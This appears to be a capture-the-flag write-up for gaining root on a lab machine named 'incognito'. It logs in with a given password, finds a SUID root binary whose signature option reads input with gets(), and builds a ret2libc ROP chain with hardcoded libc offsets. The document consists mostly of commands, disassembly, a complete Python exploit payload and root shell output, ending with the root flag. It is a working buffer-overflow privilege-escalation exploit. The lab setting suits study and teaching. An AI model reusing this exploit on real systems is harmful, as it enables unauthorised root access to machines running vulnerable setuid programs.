### Priv Esc

**prerequisites - login as user carlJ using `carlJ:Pas$w0RD59247` on machine.**

**After logging in there is a `mailing` dir in home with a single binary `smail`. Let's look at the perms first.**

```
carlJ@incognito:~/mailing$ ls -ali
total 20
    97 drwx------ 2 carlJ carlJ 4096 Apr 16  2021 .
295106 drwxr-xr-x 8 carlJ carlJ 4096 Jun 11  2021 ..
  2292 -rwsrwxr-x 1 root  root  8544 Apr  3  2021 smail
```

**Owner is root and it has the SUID bit set (that little `s`). Means it always runs as root regardless of who launches it, so if we hijack execution we get root. That's the target.**

**Check what it is and what it links against.**

```
carlJ@incognito:~/mailing$ ldd smail
        linux-vdso.so.1 (0x00007ffff7ffa000)
        libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007ffff79e2000)
        /lib64/ld-linux-x86-64.so.2 (0x00007ffff7dd3000)
```

**64-bit, dynamically linked to libc. The stack is non-executable on linux so we can't drop shellcode on it like a windows box, instead we reuse code already inside libc. Point the return address at `system()` with `/bin/sh` as its argument (ret2libc). Both of those live in libc already.**

**Quick look at the mitigations so we know what we're dealing with.**

```
carlJ@incognito:~/mailing$ cat /proc/sys/kernel/randomize_va_space
0
carlJ@incognito:~/mailing$ readelf -Ws smail | grep __stack_chk_fail
carlJ@incognito:~/mailing$ readelf -W -l smail | grep GNU_STACK
  GNU_STACK      0x000000 0x0000000000000000 0x0000000000000000 0x000000 0x000000 RW  0x10
carlJ@incognito:~/mailing$ readelf -h smail | grep Type
  Type:                              EXEC (Executable file)
```

**ASLR is off (`randomize_va_space 0`), no stack canary (`__stack_chk_fail` grep is empty), stack is `RW` so NX is on, and it's `EXEC` so no PIE. ASLR off is the big one, libc loads at the same address every run so we can hardcode everything and no leak is needed.**

**Running it, it's a little mail menu. Option 1 sends a message and uses a bounded read so it's safe. Option 2 changes the signature and that's where the bug is.**

```
carlJ@incognito:~/mailing$ ./smail
What do you wanna do
1-Send Message
2-Change your Signature
2
Write your signature...
asdfasdfasdf
Changed
```

**Disassemble the function option 2 calls, `sig()`.**

```
carlJ@incognito:~/mailing$ objdump -d smail | sed -n '/<sig>:/,/^$/p'
00000000004006b7 <sig>:
  4006b7:       55                      push   %rbp
  4006b8:       48 89 e5                mov    %rsp,%rbp
  4006bb:       48 83 ec 40             sub    $0x40,%rsp
  4006bf:       48 8d 45 c0             lea    -0x40(%rbp),%rax
  4006c3:       48 89 c7                mov    %rax,%rdi
  4006c6:       b8 00 00 00 00          mov    $0x0,%eax
  4006cb:       e8 d0 fe ff ff          callq  4005a0 <gets@plt>
  4006d0:       48 8d 3d 41 01 00 00    lea    0x141(%rip),%rdi
  4006d7:       e8 94 fe ff ff          callq  400570 <puts@plt>
  4006dc:       90                      nop
  4006dd:       c9                      leaveq
  4006de:       c3                      retq
```

**It's `gets()` into a buffer at `rbp-0x40`. `gets` has no bounds check at all, it writes until a newline, so we overflow past the 64 byte buffer straight into the saved registers.**

**The buffer sits at `rbp-0x40`, that's 64 bytes to the saved RBP, plus 8 bytes of saved RBP, so `0x40 + 8 = 72` bytes to reach the return address. Prove it with 72 A's and 8 B's under gdb.**

```
carlJ@incognito:~/mailing$ python3 -c 'import sys; sys.stdout.buffer.write(b"2\n"+b"A"*72+b"BBBBBBBB\n")' > /tmp/t
carlJ@incognito:~/mailing$ gdb -q -batch -ex 'run < /tmp/t' -ex 'i r rip rbp' ./smail
Program received signal SIGSEGV, Segmentation fault.
0x00000000004006de in sig ()
rip            0x4006de   0x4006de <sig+39>
rbp            0x4141414141414141   0x4141414141414141
```

**RBP is our A's and it crashes on the `retq`, so 72 bytes lands us on the return address. We own RIP.**

**Now the chain. On 64-bit the first argument goes in RDI, not the stack, and `system()` reads its argument from RDI. So we need a `pop rdi ; ret` gadget to load RDI with the address of `/bin/sh`, then jump to `system`. A bare `ret` is dropped in before system to fix stack alignment (glibc's `system` uses `movaps` which faults on an unaligned stack).**

```
   [ 72 bytes of "A" ]   padding to the saved return address
   [ pop rdi ; ret   ]   pops the next value into RDI
   [ &"/bin/sh"      ]   goes into RDI
   [ ret             ]   16-byte stack alignment
   [ &system         ]   system("/bin/sh")
```

**ASLR is off so libc base is `0x7ffff79e2000` and every address is base + offset. Pull the three we need.**

```
carlJ@incognito:~/mailing$ readelf -s /lib/x86_64-linux-gnu/libc.so.6 | grep ' system@@'
  1403: 000000000004f550    45 FUNC    WEAK   DEFAULT   13 system@@GLIBC_2.2.5

carlJ@incognito:~/mailing$ strings -a -t x /lib/x86_64-linux-gnu/libc.so.6 | grep '/bin/sh'
 1b3e1a /bin/sh

carlJ@incognito:~/mailing$ ROPgadget --binary /lib/x86_64-linux-gnu/libc.so.6 | grep ': pop rdi ; ret'
0x00000000000215bf : pop rdi ; ret
```

**So `system` is base+`0x4f550`, `/bin/sh` is base+`0x1b3e1a`, the `pop rdi ; ret` gadget is base+`0x215bf` and the bare `ret` right after it is base+`0x215c0`.**

**One heads up on delivering it. The menu is read with scanf, and when stdin is a plain pipe stdio slurps the whole input in one buffered read, so any commands you tack on after the payload get eaten before the shell ever spawns and the shell dies on EOF. So feed the payload, then keep your terminal attached with `cat` and type the commands live. Also don't try to paste the payload by hand, the addresses contain bytes like `0x00` and `0x1a` that the terminal mangles, python has to write the raw bytes.**

```
(python3 -c '
import sys, struct
base  = 0x7ffff79e2000
p     = lambda x: struct.pack("<Q", x)
POP   = base + 0x215bf   # pop rdi ; ret
BINSH = base + 0x1b3e1a  # "/bin/sh"
RET   = base + 0x215c0   # ret (stack align)
SYS   = base + 0x4f550   # system
buf  = b"2\n"                        # menu -> option 2
buf += b"A"*72                       # padding to saved RIP
buf += p(POP) + p(BINSH) + p(RET) + p(SYS)
buf += b"\n"
sys.stdout.buffer.write(buf)
'; cat) | ./smail
```

**Screen looks frozen after you run it but that's the root shell sitting there, just type into it.**

```
What do you wanna do
1-Send Message
2-Change your Signature
Write your signature...
Changed
id
uid=0(root) gid=1002(carlJ) groups=1002(carlJ)
cat /root/root.txt
f21979de76c0302154cc001884143ab2
```

**`uid=0(root)`. Overflow the signature buffer, overwrite the return with `pop rdi -> /bin/sh -> system`, and since the binary is SUID we come back as root.**

**root.txt -> `f21979de76c0302154cc001884143ab2`**
